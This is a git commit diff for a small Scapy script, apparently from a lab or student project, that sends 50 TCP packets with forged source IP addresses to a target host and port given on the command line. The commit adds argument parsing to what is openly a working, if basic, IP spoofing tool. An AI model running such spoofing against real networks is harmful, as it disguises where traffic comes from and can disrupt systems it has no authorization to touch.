16ba888173d78e31d5a53b33a3978e30f899ef6c
Lucas Fridez <lucas@fridez.dev>
2021-04-29 12:11:17 +0200

    Add: parser for spoofing

--- attacks/spoofing-attack.py
+++ attacks/spoofing-attack.py
@@ -3,16 +3,53 @@ Authors : Fridez Lucas, Maxime Welcklen
 Attack :  Very basic TCP spoofing over N packets
 """
 from scapy.all import *
+from scapy.layers.inet import *
+import argparse
 
 
-A = "1.2.3." # spoofed source IP address without the last number
-B = "192.168.1.103" # destination IP address
-C = RandShort() # source port
-D = 9999 # destination port
-payload = "Hello from scappy spoofing !" # packet payload
+B = "192.168.1.103"  # destination IP address
+
+D = 9999  # destination port
+payload = "Hello from scappy spoofing !"  # packet payload
 
 
-# Send 50 packets to be really visible
-for i in range(50,100):
-    spoofed_packet = IP(src=f"{A}{i}", dst=B) / TCP(sport=C, dport=D) / payload
-    send(spoofed_packet, iface="enp0s3")
+def __configure_argparse__():
+    """Configure argparser
+
+    Returns:
+       parser: Arguments parser
+    """
+    parser = argparse.ArgumentParser(
+        description='SYN attack arguments')
+
+    # Required params
+    requiredNamed = parser.add_argument_group('Optionnal named arguments')
+    requiredNamed.add_argument(
+        '-d', '--dst', help='Destination address', required=True)
+    requiredNamed.add_argument(
+        '-p', '--dport', type=int, help='Destination port', required=True)
+    requiredNamed.add_argument(
+        '-i', '--iface', help='Interface', required=True)
+
+    return parser
+
+
+def main(destination_ip, dport, iface):
+    """Main method that handle attack logic
+
+    Args:
+       destination_ip (str): Destination IP
+    """
+    SOURCE_IP = "1.2.3."
+    SOURCE_PORT = RandShort()
+
+    # Send 50 packets to be really visible
+    for i in range(50, 100):
+        spoofed_packet = IP(src=f"{SOURCE_IP}{i}", dst=destination_ip) / \
+            TCP(sport=SOURCE_PORT, dport=dport) / payload
+        send(spoofed_packet, iface=iface)
+
+if __name__ == "__main__":
+    parser = __configure_argparse__()
+    args = parser.parse_args()
+    main(args.dst, args.dport, args.iface)
